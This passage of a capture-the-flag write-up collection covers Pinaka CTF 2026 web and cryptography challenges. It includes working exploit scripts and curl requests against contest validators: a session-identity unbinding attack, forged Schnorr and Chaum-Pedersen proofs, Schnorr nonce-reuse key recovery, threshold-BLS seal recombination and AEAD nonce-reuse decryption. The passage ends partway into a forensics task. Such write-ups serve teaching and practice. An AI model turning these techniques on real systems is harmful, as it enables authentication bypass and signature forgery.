	"sequence": trail,
}))
```

title: Vibhishana: The Oath of Refuge
excerpt: An HTTP/JSON gateway implements a session-ticket / refuge-grant attestation flow. Exploit session-identity unbinding to elevate Vibhishana without a Council grant.
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Web · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

>An HTTP/JSON gateway implements a session-ticket / refuge-grant attestation flow. Exploit session-identity unbinding to elevate Vibhishana without a Council grant. Connection: [http://130.210.48.10:9009/](http://130.210.48.10:9009/ "http://130.210.48.10:9009/")

### Solve:
- These are the endpoints we had:
	- /gateway/roster -> exposed refuge grants
	- /oath/swear -> create session ticket
	- /refuge/elevate -> exchanges ticket and grant for trusted one
	- /refuge/sanctum -> flag get
- Session ticket were in this structure:
```
{
    "sub": "vibhishana",
    "sid": "ABC123",
    "tier": "provisional"
}
```
- Refuge grants also like this but signed
- Both tokens get authenticated using `SHA256` and the payloads were base64url encoded
- In `/refuge/elevate`:
	- first the signature and session ticket get verified. also tier was checked if provisional
	- verified council signature on refugee grant
	- checked whether `ticket.sid == grant.sid` but the `sub` was never checked
- Now we had to retreive the public grant and decode its payload to extract the sid.
- `/oath/swear {name, sid?}` lets someone propose the `sid`. so we get a provisional ticket for `sub=vibhishana` carrying sugriva grant `sid`, then elevate with sugriva public grant.
- So our chain is `public grant`->`provisional oath`->`eleavate`->`trusted ticket` and finnaly the flag
- Heres my script:
```python
#!/usr/bin/env python3
import json
import base64
import urllib.request

BASE = "http://130.210.48.10:9009"

def post(path, obj):
    req = urllib.request.Request(
        BASE + path, data=json.dumps(obj).encode(),
        headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=20) as r:
        return json.loads(r.read())

def dec(tok):
    s = tok.split(".")[0]
    return json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)))

roster = json.loads(urllib.request.urlopen(BASE + "/gateway/roster", timeout=20).read())
grant = roster["grants_on_record"][0]["grant"]
sid = dec(grant)["sid"]                     

oath = post("/oath/swear", {"name": "vibhishana", "sid": sid})
ticket = oath["ticket"]                       

trusted = post("/refuge/elevate", {"ticket": ticket, "grant": grant})["ticket"]

print(post("/refuge/sanctum", {"ticket": trusted})["flag"])

```
- Running it, I got the flag
![Vibhishana: The Oath of Refuge: step screenshot](https://cyberhx.com/writeups/cryptonite/web/vibhishana.webp)
## Flag:
`PINAKA{vibhishana_sharanagati_session_bound_identity_unbound}`

title: Janaka's Court: The False Witness
excerpt: Forge a 1-of-2 Schnorr OR-proof deposition for a forbidden docket. The Fiat-Shamir challenge omits the prover's commitments, so both OR branches can be simulated. Validator: https://pinaka-m02-cyber-xo-x.vercel.app/
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Cryptography · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

## Challenge

> Forge a 1-of-2 Schnorr OR-proof deposition for a forbidden docket. The Fiat-Shamir challenge omits the prover's commitments, so both OR branches can be simulated.
> Validator: https://pinaka-m02-cyber-xo-x.vercel.app/

We're given `params.json`, `instance.json`, `pinaka_testimony.py` and a `README.md`.

It's a 1-of-2 Schnorr OR-proof (a "deposition"). To testify for a docket with identity pair `(Y0, Y1)`, you prove you know the discrete log of Y0 OR Y1, without saying which. We need to get the court to admit a deposition for the forbidden `false-witness` docket, whose two identities are nullified seals nobody holds a key to.

## The protocol

A deposition is `(t0, t1, c0, c1, s0, s1)`, and `verify` accepts it when:

```
c0 + c1 == c  (mod q)
g^s0 == t0 * Y0^c0  (mod p)
g^s1 == t1 * Y1^c1  (mod p)
```

The whole security of an OR-proof rests on how `c` is computed. In an honest one, the challenge binds the commitments `t0` and `t1`, which forces the prover to actually know one of the two witnesses: you can simulate a branch only after `c` is fixed, and `c` isn't fixed until you commit.

## The bug

The default binding is `binding_mode = 0`, which calls `_h_bind`:

```python
def _h_bind(ctx, Y0, Y1, q):
    m = hashlib.sha256(b"PINAKA-M02-FS")
    for lbl, v in (("ctx", ctx), ("Y0", Y0), ("Y1", Y1)):
        m.update(b"|"); m.update(lbl.encode()); m.update(b"|"); m.update(str(v).encode())
    return int(m.hexdigest(), 16) % q
```

`c` is hashed from `ctx`, `Y0` and `Y1` only. The commitments `t0` and `t1` aren't in it. So `c` is completely determined before you pick any commitment, which is exactly the thing the README means by "a question settled before the witness has said a single word".

(The module also ships `_h_bind_full`, which does fold in `t0, t1`, and `verify_strict` uses it. That would be the correct version. But the deployed `verify` uses mode 0.)

Once `c` is fixed up front, you can simulate both branches with the standard Schnorr simulator and no witness at all.

## The forge

Compute `c = H(ctx, Y0, Y1)` first. Then for each branch, pick `c_i` and `s_i` freely and solve for the commitment `t_i` that makes the equation hold:

```
t_i = g^s_i * Y_i^(-c_i)  (mod p)   =>   g^s_i == t_i * Y_i^c_i
```

The only constraint left is `c0 + c1 == c`, so pick `c0` at random and set `c1 = c - c0`. Both verification equations hold by construction. `pinaka_testimony.py` is public arithmetic with no secrets, so I used its challenge and verifier directly:

```python
import pinaka_testimony as T
import secrets, json

P = T.load_params(); I = T.load_instance()
p, g, q, ctx = P["p"], P["g"], P["q"], P["ctx"]
Y0, Y1 = (int(I["dockets"]["false-witness"]["identities"][k]) for k in ("Y0", "Y1"))

c = T._select_binding(P, ctx, Y0, Y1, 1, 1, q)   # mode 0 ignores the commitments
c0 = secrets.randbelow(q); c1 = (c - c0) % q
s0 = secrets.randbelow(q); s1 = secrets.randbelow(q)
t0 = pow(g, s0, p) * pow(Y0, -c0 % q, p) % p
t1 = pow(g, s1, p) * pow(Y1, -c1 % q, p) % p

dep = {"t0": t0, "t1": t1, "c0": c0, "c1": c1, "s0": s0, "s1": s1}
print("verify:", T.verify(P, Y0, Y1, dep))
json.dump({"docket": "false-witness", "deposition": dep}, open("dep.json", "w"))
```

Passing `t0 = t1 = 1` into the challenge call is fine, because mode 0 ignores those arguments anyway.

```
python3 pinaka_testimony.py
specimen deposition for 'enrolled-nobles' verifies: True

python3 forge.py
verify: True
```

The forged deposition passes both equations for the forbidden identity pair, with no seal exponent anywhere.

## Submitting

```
curl -sS -X POST https://pinaka-m02-cyber-xo-x.vercel.app/court/depose \
  -H "Content-Type: application/json" -d @dep.json
{"docket":"false-witness","flag":"PINAKA{janaka_false_witness_the_question_asked_before_the_answer}","proclamation":"The court records a witness where none could stand.","result":"admitted"}
```

## Flag

```
PINAKA{janaka_false_witness_the_question_asked_before_the_answer}
```

## Summary

1. The OR-proof challenge `c = H(ctx, Y0, Y1)` leaves out the commitments `t0, t1`, so it's fixed before you commit.
2. With `c` known up front, pick `c0, s0, s1` freely, set `c1 = c - c0`, and solve `t_i = g^s_i * Y_i^(-c_i)` for each commitment.
3. Both branches simulate with no witness, the deposition verifies for the forbidden docket, and the clerk admits it.

title: Nala's Blueprint: The Secret Geometry
excerpt: Recover corrupted Reed-Solomon symbols, verify pier measurements lie on a parabola, compute the keystone apex, then exploit AEAD nonce-reuse between the manifest and blueprint ciphertexts to break the seal.…
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Cryptography · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

## Challenge

> Recover corrupted Reed-Solomon symbols, verify pier measurements lie on a parabola, compute the keystone apex, then exploit AEAD nonce-reuse between the manifest and blueprint ciphertexts to break the seal.
> Validator: https://pinaka-s05-cyber-xo-x.vercel.app/

We're given `parity.rsc`, `archive.sealed`, `blueprint_format.txt` and a `README.md`.

## Recon

I opened both files and looked at the headers. `parity.rsc` starts with `PNKSETU1` and `archive.sealed` starts with `PNKSEAL1`. They're both custom formats, so I just read through the hex dump.

![hex-dump](https://cyberhx.com/writeups/cryptonite/crypto/hex.webp)

The erased flag together with the k/n values in `parity.rsc` looked a lot like a Reed-Solomon code.

## Recovering the pier heights

I dropped the 4 erased symbols, which leaves 20 points for 12 unknowns. That's enough slack to correct up to 4 wrong values.

I used Berlekamp-Welch over GF(65537), trying e = 0, 1, 2 and so on. For each e, I checked that the linear system had a solution, that Q/E divided exactly, and that the result disagreed with at most e of the points. e = 0 to 3 have no solution at all, which makes sense, because no degree-11 polynomial fits all 20 points when some of them are wrong. At e = 4 it works: Q/E divides cleanly and the result disagrees with exactly 4 points, at x = 8, 11, 14 and 18.

The recovered pier heights:

```
[601, 1228, 1795, 2302, 2749, 3136, 3463, 3730, 3937, 4084, 4171, 4198]
```

## The apex

The gaps between the heights go 627, 567, 507, ... and drop by 60 every time, so it's a quadratic:

```
h(i) = -30*i^2 + 657*i + 601
```

The apex is `C - B^2/(4A) = 503769/120 = 167923/40`.

![Nala's Blueprint: The Secret Geometry: step screenshot](https://cyberhx.com/writeups/cryptonite/crypto/check1.webp)

## The seal

`blueprint_format.txt` gives the exact manifest layout: `keystone_apex=<num>/<den>`, `piers=<k>`, one `hNN=<height>` line per pier, `SETU-MANIFEST-v1`, then dots up to 512 bytes. I already had the heights and the apex, so I could rebuild the whole plaintext byte for byte.

Then I compared the nonces of the two records, and they were the same (`fec3116eaaad0420617b4b5a` for both). Nonce reuse, so:

```
keystream = manifest ciphertext XOR rebuilt manifest
blueprint = blueprint ciphertext XOR keystream
```

The output was readable text (`SETU-BLUEPRINT-v1`, `engineer=Nala-Setukarma`), so I knew it worked.

```
keystone_seal=3b4c5970eeaf629a1bfb38d05c46166458a654cc4fdb4ce4b7b26506e461bcee
```

![Nala's Blueprint: The Secret Geometry: step screenshot](https://cyberhx.com/writeups/cryptonite/crypto/check2.webp)

## Submitting

I sent all three values (the measurements, the apex and the seal) in a POST to `/setu/keystone` with curl and got the flag:

![Nala's Blueprint: The Secret Geometry: step screenshot](https://cyberhx.com/writeups/cryptonite/crypto/curl.webp)

```
PINAKA{nala_blueprint_ecc_geometry_and_nonce_reuse}
```

## Summary

1. `parity.rsc` holds a Reed-Solomon codeword. Drop the 4 erased symbols and run Berlekamp-Welch over GF(65537). It corrects 4 errors (x = 8, 11, 14, 18) and gives the 12 pier heights.
2. The heights form a quadratic, `-30*i^2 + 657*i + 601`, whose apex is 167923/40.
3. Both records in `archive.sealed` use the same nonce. The manifest's layout is public and its values are the heights and apex from steps 1-2, so rebuilding it and XORing gets the keystream back, and that decrypts the blueprint and gives the keystone seal.

title: Sugriva's Covenant: The Divided Oath
excerpt: No lone captain commands the host. The covenant demands a quorum - but the ledger is damaged and the oath-seals are scattered across revisions. Validator: https://pinaka-k02-cyber-xo-x.vercel.app/
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Cryptography · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

## Challenge

> No lone captain commands the host. The covenant demands a quorum - but the ledger is damaged and the oath-seals are scattered across revisions.
> Validator: https://pinaka-k02-cyber-xo-x.vercel.app/

We're given `README.md`, `params.json`, `covenant.py` and `covenant_log.json`.

The setup is a threshold-BLS scheme over BLS12-381. A command is authorised only when 3 of the 5 commanders' oath-seals Lagrange-combine into a signature that verifies under the council key `X`. We have none of the secret shares. The job is to get the covenant to ratify a forbidden order (`strike-order`, "MARCH ON KISHKINDHA AT DAWN...") that no quorum ever sealed.

## The weakness

Both the README and `covenant.py` keep pointing at what the token is bound to. The token is just:

```python
def oath_token(command_id, epoch):
    return f"PINAKA-K02-OATH|cmd={command_id}|epoch={epoch}".encode()
```

![Sugriva's Covenant: The Divided Oath: step screenshot](https://cyberhx.com/writeups/cryptonite/crypto/oath.webp)

The body and the revision aren't in there. So a commander's seal on `strike-order` at epoch 7 is the same no matter which amendment it was attached to, or what the amendment's text actually was.

The ledger plays right into that. It leaks seals for commanders 1, 2, 4 and 5, taken from three amendments that all lapsed (revisions 4, 5 and 6). None of those amendments reached 3 signers on its own. But because the token ignores the body, all four leaked seals are valid partials on the exact same `strike-order` token. Four is already more than the threshold of 3.

## Running the checks

`covenant.py` ships with a self-check, so I ran it first:

```
python3 covenant.py
seal of commander 1 (Hanuman) verifies: True
seal of commander 2 (Nala) verifies: True
seal of commander 4 (Tara) verifies: True
seal of commander 5 (Jambavan) verifies: True
combined 3-of-5 signature verifies under council key: True
```

![Sugriva's Covenant: The Divided Oath: step screenshot](https://cyberhx.com/writeups/cryptonite/crypto/covenant.webp)

So any 3 of the leaked seals combine into a signature that verifies under the council key. That's the whole break.

## Building the signature

I put the same steps into a short script so it prints the combined signature:

```python
import covenant as C

p, L = C.load_params(), C.load_ledger()
tok = C.oath_token(L["protected_command_id"], p["council_epoch"])
X = C.deser_g1(p["council_public_key"])

seals = {int(i): C.deser_g2(v["oath_seal"]) for i, v in L["leaked_seals"].items()}
for i, s in seals.items():
    Xi = C.deser_g1(p["commander_verify_keys"][str(i)])
    print(i, C.verify_partial(Xi, s, tok))

quorum = dict(list(seals.items())[:p["threshold"]["t"]])
sig = C.combine(quorum)
assert C.bls_verify(X, sig, tok)
print("signature:", C.ser_g2(sig))
```

It rebuilds the `strike-order` token, deserialises the leaked seals, Lagrange-combines three of them (commanders 1, 2 and 4) at x = 0, verifies the result under the council key, and prints it:

```
token: PINAKA-K02-OATH|cmd=strike-order|epoch=7
1 True
2 True
4 True
5 True
signature: a6c927d5974ea254018ac3abe5ff53b2de1e07fd71d0999ea0ce1772d4f6f675dadf3343c8b538b0aad05ed389b574bb0465054a5a068539aba46e4c02383b694fba7847d862929f24989a53c35b8b5cb16b8ce38ae84c20f591ff2ffe8ccf4d
```

![Sugriva's Covenant: The Divided Oath: step screenshot](https://cyberhx.com/writeups/cryptonite/crypto/signature.webp)

## Submitting

I submitted the forbidden body with that signature at a fresh revision (8, higher than the standing order's 3):

```
curl -X POST "https://pinaka-k02-cyber-xo-x.vercel.app/covenant/ratify" \
  -H "Content-Type: application/json" \
  -d '{
    "command_id": "strike-order",
    "revision": 8,
    "body": "UNSEAL THE DIVIDED OATH: MARCH ON KISHKINDHA AT DAWN AND SEIZE THE THRONE OF VALI",
    "signature": "a6c927d5974ea254018ac3abe5ff53b2de1e07fd71d0999ea0ce1772d4f6f675dadf3343c8b538b0aad05ed389b574bb0465054a5a068539aba46e4c02383b694fba7847d862929f24989a53c35b8b5cb16b8ce38ae84c20f591ff2ffe8ccf4d"
  }'
{"command_id":"strike-order",
 "flag":"PINAKA{sugriva_divided_oath_seals_scattered_across_revisions}",
 "proclamation":"The divided oath is unsealed; Kishkindha answers a command the council never gave.",
 "result":"ratified","revision":8}
```

## Flag

```
PINAKA{sugriva_divided_oath_seals_scattered_across_revisions}
```

## Summary

1. The oath-token only binds the command id and the epoch, not the body or the revision. So a commander's seal on a slot is identical across every amendment.
2. The ledger leaks seals from commanders 1, 2, 4 and 5, gathered from three different lapsed amendments. All of them are valid partials on the one `strike-order` token.
3. Lagrange-combine any 3 of them with the public `covenant.py` to get a signature that verifies under the council key. No secret share needed.
4. Submit the forbidden body with that signature at a fresh revision to ratify it and get the flag.

title: The Last Astra: An Unprovable Command
excerpt: Two seals guard the forbidden order. Both must accept before the Astra fires. The sages were certain no single command could deceive them both. Validator: https://pinaka-l05-cyber-xo-x.vercel.app/
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Cryptography · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

## Challenge

> Two seals guard the forbidden order. Both must accept before the Astra fires. The sages were certain no single command could deceive them both.
> Validator: https://pinaka-l05-cyber-xo-x.vercel.app/

We're given `params.json`, `instance.json`, `pinaka_command.py` and a `README.md`.

The command desk fires an order only when two independent seals both accept a command `v` against that order's published syndrome `t`. We need to fire the forbidden order `loose-last-astra`, whose syndrome has no honest opening at all. The claim the challenge wants us to break is "two seals can't both be fooled by one command".

## The scheme

It's a gadget / SIS-style setup. The matrix `A = I_m (x) g` is block-diagonal, with gadget row `g = (B^0, B^1, ..., B^{k-1})`. The parameters are `B = 65536` (2^16), `k = 8`, `m = 3`, so a command is `v` in `[0, B)^24`.

The syndrome just splits into 3 registers. For register `i`, `t_i = sum_l v[i*k+l] * B^l`, which is the base-B digit expansion of some value `S_i`. Because each digit is in `[0, B)` and there are `k = 8` of them, an honest `S_i` can only ever reach `[0, B^k)`, and `B^k = 2^128`.

The two seals are:

```
Dharma Seal :  0 <= v_j < B  for all j   AND   A.v == t  (mod p)
Rigor  Seal :  0 <= v_j < B  for all j   AND   A.v == t  (mod p2)
```

with `p` a 192-bit prime and `p2` a 208-bit prime.

## The bug

Neither seal ever checks that `t` is actually in the achievable range `[0, B^k)`. Each only checks a congruence modulo its own prime. That's the whole hole.

The forbidden syndrome values are enormous (around 600 digits each), far bigger than `B^k`, so there's no honest integer opening. But look at the sizes:

```
B^k = 2^128   (129 bits)
p             (192 bits)   > B^k
p2            (208 bits)   > B^k
```

Both primes are bigger than `B^k`. So if I can find a value `S_i` with `0 <= S_i < B^k` that satisfies `S_i == t_i (mod p)` and `S_i == t_i (mod p2)`, then its base-B digits are a perfectly bounded command that both seals accept, even though `t_i` itself is nowhere near the legal range.

And the author built the forbidden syndrome so this works: each `t_i` was chosen so that `t_i mod p == t_i mod p2`, and that shared residue is already `< B^k`. In other words `t_i` is congruent, mod `p*p2`, to a small in-range value. Checking all three registers confirms it:

```
reg 0:  t % p == t % p2 == 222096782302045457542069122992793806115   (< B^k)
reg 1:  t % p == t % p2 == 275613658661615283968060356816014367549   (< B^k)
reg 2:  t % p == t % p2 == 209736133354915237605252499179498355628   (< B^k)
```

Two verifiers give no extra soundness when they share the same blind spot. Here both skip the range check, so a command that's illegal over the integers is still congruent to the target under both primes at once.

## The exploit

For each register, take the common residue `S_i = t_i mod p` and emit its 8 base-B digits. Concatenate the three registers into 24 integers. `pinaka_command.py` is public arithmetic, so I used its `opening` and seal functions directly. I ran its self-check first, then forged:

```python
import pinaka_command as C

params = C.load_params("params.json")
inst = C.load_instance("instance.json")
B = params["gadget"]["B"]; k = params["gadget"]["k"]
p = params["seals"]["dharma_seal"]["modulus_p"]
p2 = params["seals"]["rigor_seal"]["modulus_p2"]
t = inst["orders"]["loose-last-astra"]["syndrome"]

v = []
for ti in t:
    S = ti % p
    assert ti % p == ti % p2 and 0 <= S < B**k
    v += C.opening(S, B, k)

print(v)
print("dharma", C.dharma_seal(params, v, t),
      "rigor", C.rigor_seal(params, v, t),
      "both", C.both_seals(params, v, t))
```

```
python3 forge.py
hold-position: dharma = True  rigor = True  both = True
[25891, 13729, 48228, 53333, 26052, 48198, 18635, 42774, 23357, 44623, 11421, 64876, 806, 13712, 17028, 53081, 48044, 45191, 45694, 9504, 18718, 16686, 46528, 40393]
dharma True rigor True both True
```

Both seals accept the forged command locally, so it's ready to submit.

## Submitting

```
curl -X POST "https://pinaka-l05-cyber-xo-x.vercel.app/astra/command" \
  -H "Content-Type: application/json" \
  -d '{"order": "loose-last-astra", "command": [25891, 13729, 48228, 53333, 26052, 48198, 18635, 42774, 23357, 44623, 11421, 64876, 806, 13712, 17028, 53081, 48044, 45191, 45694, 9504, 18718, 16686, 46528, 40393]}'
{
  "dharma_seal": true,
  "rigor_seal": true,
  "result": "fired",
  "order": "loose-last-astra",
  "proclamation": "The Last Astra is loosed by a command that could not be proven.",
  "flag": "PINAKA{the_last_astra_an_unprovable_command}"
}
```

## Flag

```
PINAKA{the_last_astra_an_unprovable_command}
```

## Summary

1. A command opens a syndrome that honestly can only reach `[0, B^k)` with `B^k = 2^128`. Both seals only check a congruence, one mod `p` (192-bit), one mod `p2` (208-bit), and neither checks the target is in range.
2. Both primes are larger than `B^k`, and the forbidden syndrome was built so `t_i mod p == t_i mod p2` with that shared residue below `B^k`.
3. Take `S_i = t_i mod p` per register, expand it in base B, and both seals accept the 24-digit command even though the order has no honest opening.

title: Vaidehi: The Sealed Covenant
excerpt: Forge a 3-of-3 MuSig Schnorr council seal for a forbidden revision. The signing session reuses nonces across revisions; two genuine seals yield the aggregate private key via nonce-reuse extraction. Validator:…
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Cryptography · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

## Challenge

> Forge a 3-of-3 MuSig Schnorr council seal for a forbidden revision. The signing session reuses nonces across revisions; two genuine seals yield the aggregate private key via nonce-reuse extraction.
> Validator: https://pinaka-m05-cyber-xo-x.vercel.app/

We're given `params.json`, `instance.json` and `pinaka_covenant.py`.

It's a MuSig-style Schnorr multisignature over secp256k1, a 3-of-3 council. A revision is sealed by `(R, s)` and is valid for `(doc_id, revision, body)` when `s*G == R + e*X`, where `X` is the aggregate council key and `e = H(R, X, doc_id, revision, body)`. We need a valid seal on a forbidden revision 7 that the council refused to sign, and we don't have any secret keys.

## The weakness

`params.json` spells it out in `session_rule`: the council opens one signing session per document, and the pre-committed aggregate nonce `R` is fixed for that document and reused for every revision sealed in it.

That's fatal for Schnorr. Look at `instance.json`: revisions 1 and 2 are both genuine seals, and they have the identical `R`:

```
R.x = 78590942717428059269889991809638578455145461928612893688259669499439350188552
```

A Schnorr seal is `s = k + e*x`, where `k` is the nonce behind `R` and `x` is the aggregate secret. Two seals under the same `k`:

```
s1 = k + e1 * x
s2 = k + e2 * x
s1 - s2 = (e1 - e2) * x
```

So `x = (s1 - s2) / (e1 - e2) mod n`. That recovers the aggregate council private key outright. Once you have `x`, you can recover `k = s1 - e1*x` too, and then sign anything you want, including the forbidden revision.

## Recovering the key

`pinaka_covenant.py` is public arithmetic with no secrets in it, so I used its `key_agg` and `challenge` directly. First I ran its self-check to be sure the aggregate key and the two seals were real:

```
python3 pinaka_covenant.py
aggregate key reproduces params.aggregate_key: True
ratified revision 1 seal verifies: True
ratified revision 2 seal verifies: True
```

Then the extraction and the forge:

```python
import pinaka_covenant as P

params = P.load_params("params.json")
inst = P.load_instance("instance.json")
X, _ = P.key_agg([m["pubkey"] for m in params["council"]])
N = P.N
doc_id = inst["doc_id"]

r1, r2 = inst["ratified_revisions"]
R = tuple(r1["seal"]["R"])
s1, s2 = r1["seal"]["s"], r2["seal"]["s"]
e1 = P.challenge(R, X, doc_id, r1["revision"], r1["body"])
e2 = P.challenge(R, X, doc_id, r2["revision"], r2["body"])

x = (s1 - s2) * pow(e1 - e2, -1, N) % N   # aggregate secret
k = (s1 - e1 * x) % N                     # the reused nonce

t = inst["forbidden_target"]
e7 = P.challenge(R, X, doc_id, t["revision"], t["body"])
s7 = (k + e7 * x) % N
seal = {"R": list(R), "s": s7}
print("x*G == X:", P.mul(P.G, x) == X)
print("forged seal verifies:", P.verify_seal(X, doc_id, t["revision"], t["body"], seal))
print("s =", s7)
```

```
python3 forge.py
x*G == X: True
forged seal verifies: True
s = 94047503437372943715288006595592556461899117252581377777093910299313937128897
```

`x*G == X` is the proof the extraction worked: the recovered scalar really is the aggregate council secret. The reused `R` is kept as is, and the new `s7` is signed over the revision-7 challenge.

## Submitting

```
curl -X POST "https://pinaka-m05-cyber-xo-x.vercel.app/covenant/seal" \
  -H "Content-Type: application/json" \
  -d '{
    "doc_id": "mithila-betrothal-covenant",
    "revision": 7,
    "body": "Revision 7: Mithila cedes Vaidehi and her dominion to the demon-king; the kingdom'\''s sovereignty passes to Lanka.",
    "seal": {
      "R": [78590942717428059269889991809638578455145461928612893688259669499439350188552, 86399799529526984061083292644132654262624075746664350706617581532843906706131],
      "s": 94047503437372943715288006595592556461899117252581377777093910299313937128897
    }
  }'
{
  "result": "accepted",
  "revision": 7,
  "flag": "PINAKA{one_session_one_nonce_the_council_seal_undone}",
  "proclamation": "The sealed covenant the council refused now bears a valid seal."
}
```

## Flag

```
PINAKA{one_session_one_nonce_the_council_seal_undone}
```

## Summary

1. The council reuses one nonce `R` across every revision in a document session, which is the classic Schnorr nonce-reuse hole.
2. Revisions 1 and 2 are genuine seals sharing that `R`. From `s1 - s2 = (e1 - e2)*x`, recover the aggregate secret `x`, then the nonce `k`.
3. Sign the forbidden revision 7 with `x` and `k`, reusing the same `R`, and submit to ratify it.

title: Vishvamitra: The Broken Invocation
excerpt: Exploit a flaw in a Fiat-Shamir non-interactive ZK grant-proof protocol. Forge a valid proof for the forbidden Brahmastra using only public parameters and a leaked lesser-boon grant. Validator:…
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Cryptography · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

## Challenge

> Exploit a flaw in a Fiat-Shamir non-interactive ZK grant-proof protocol. Forge a valid proof for the forbidden Brahmastra using only public parameters and a leaked lesser-boon grant.
> Validator: https://pinaka-a03-cyber-xo-x.vercel.app/

We're given `params.json`, `instance.json`, `pinaka_invocation.py` and a `README.md`.

It's a Chaum-Pedersen equal-discrete-log proof made non-interactive with Fiat-Shamir. A boon tuple `(A, B)` is valid when there's a single `w` with `A = g^w` and `B = h^w` mod p. A proof `(t1, t2, s)` is accepted for `(A, B)` iff:

```
g^s == t1 * A^c  (mod p)      and      h^s == t2 * B^c  (mod p)
```

with `c` the Fiat-Shamir challenge. We have a leaked proof for the lesser boon `bala-atibala`, and we need to forge a valid proof for the forbidden `brahmastra` tuple with no witness.

## The two public facts

Two things in the params set this up.

First, the elevation relation. Each supreme tuple is just the lesser one shifted by a public offset `d`, the same `d` on both sides:

```
brahmastra.A = bala.A * g^d  (mod p)
brahmastra.B = bala.B * h^d  (mod p)
```

I checked this against the actual numbers and it holds.

Second, and this is the bug, the Fiat-Shamir challenge is hashed from the commitments `(t1, t2)` alone:

```python
def fiat_shamir_challenge(t1, t2, q):
    m = hashlib.sha256(b"PINAKA-A03-FS")
    m.update(b"|t1|"); m.update(str(t1).encode())
    m.update(b"|t2|"); m.update(str(t2).encode())
    return int(m.hexdigest(), 16) % q
```

The statement `(A, B)` is not in the hash. So the challenge isn't bound to which weapon you're proving. That's the unfastened syllable the README keeps hinting at.

## The forge

Keep the leaked proof's `t1` and `t2`. Because the challenge only depends on those, the brahmastra proof gets the exact same `c`. The leaked proof satisfies `g^s = t1 * A0^c`. I want a proof for `A1 = A0 * g^d`:

```
t1 * A1^c = t1 * (A0 * g^d)^c = t1 * A0^c * g^(d*c) = g^s * g^(d*c) = g^(s + d*c)
```

So `s' = s + d*c` makes `g^s' == t1 * A1^c`. The B side works out identically with the same `d` and `c`, which is exactly why the offset had to be the same on both components. One new scalar and the whole thing verifies.

`pinaka_invocation.py` is public arithmetic with no secrets, so I used its challenge and verifier directly. I ran its self-check first, then forged:

```python
import pinaka_invocation as C

P = C.load_params("params.json")
I = C.load_instance("instance.json")
q, d = P["q"], P["elevation_offset_d"]
lg = I["leaked_grant"]["proof"]
bra = I["weapons"]["brahmastra"]["boon_tuple"]

c = C.fiat_shamir_challenge(lg["t1"], lg["t2"], q)
forge = {"t1": lg["t1"], "t2": lg["t2"], "s": (lg["s"] + d * c) % q}
print("verifies:", C.verify(P, bra["A"], bra["B"], forge))
```

```
python3 forge.py
leaked grant for 'bala-atibala' verifies: True
verifies: True
```

So the forged proof passes both equations for the brahmastra tuple, with no witness anywhere.

## Submitting

```
curl -X POST "https://pinaka-a03-cyber-xo-x.vercel.app/armory/invoke" \
  -H "Content-Type: application/json" \
  -d @body.json
```

where `body.json` is `{"weapon": "brahmastra", "proof": {"t1": ..., "t2": ..., "s": <s + d*c>}}`. The armory grants the Brahmastra and returns the flag:

```
PINAKA{vishvamitra_bala_atibala_one_syllable_unbound}
```

## Summary

1. The Fiat-Shamir challenge `c` is hashed from `(t1, t2)` only, not the statement `(A, B)`. So the same `c` applies to any tuple reusing those commitments.
2. The forbidden tuple is the leaked one elevated by a public offset `d`: `A1 = A0*g^d`, `B1 = B0*h^d`.
3. Keep the leaked `(t1, t2)`, set `s' = s + d*c`, and the proof verifies for brahmastra. Submit it to get the flag.

title: Ahalya: The Petrified Memory
excerpt: Given a raw NVM image, a damaged write-ahead log and a logical-to-physical map checkpoint, recover the last committed version of a sealed record and attest to the whole archive. The record is logical id 3155.
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Reverse engineering · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

**Category:** forensics / persistent-memory recovery
**Flag:** `PINAKA{ahalya_awakens_when_her_last_committed_memory_is_read_back_whole}`

## Overview

Given a raw NVM image, a damaged write-ahead log and a logical-to-physical map checkpoint, recover the last *committed* version of a sealed record and attest to the whole archive. The record is logical id 3155.

Files:

- `archive.nvm`: 11 MB raw NVM image, 47,189 fixed 235-byte physical frames
- `archive.log`: 1.8 MB damaged write-ahead redo/undo log
- `l2p.map`: logical-to-physical map checkpoint, geometry, relocation table, sealed lid

## Analysis

**Frame format in `archive.nvm`.** Every frame is 235 bytes:

- offset 0: 8 bytes -> magic `PNKPMEM1`
- offset 8: 2 bytes -> lid, little endian
- offset 10: 2 bytes -> epoch, little endian
- offset 12: 2 bytes -> pad
- offset 14: 4 bytes -> txn, little endian
- offset 18: 1 byte -> valid / flag byte
- offset 19: 4 bytes -> CRC32 over bytes 0..18
- offset 23: 10 bytes -> duplicate lid, epoch, txn block
- offset 23: 200 bytes -> record body
- offset 223: 4 bytes -> trailer
- offset 227: 8 bytes -> `PNKSEAL1` persistence seal

The frame transaction number is `pba + 1`. The record body has its own 9-byte prefix:

```
body[0:2]  lid   (u16 LE)
body[2:6]  epoch (u32 LE)
body[6:10] txn   (u32 LE)
body[10:]  ASCII payload, padded with '.' to 200 bytes
```

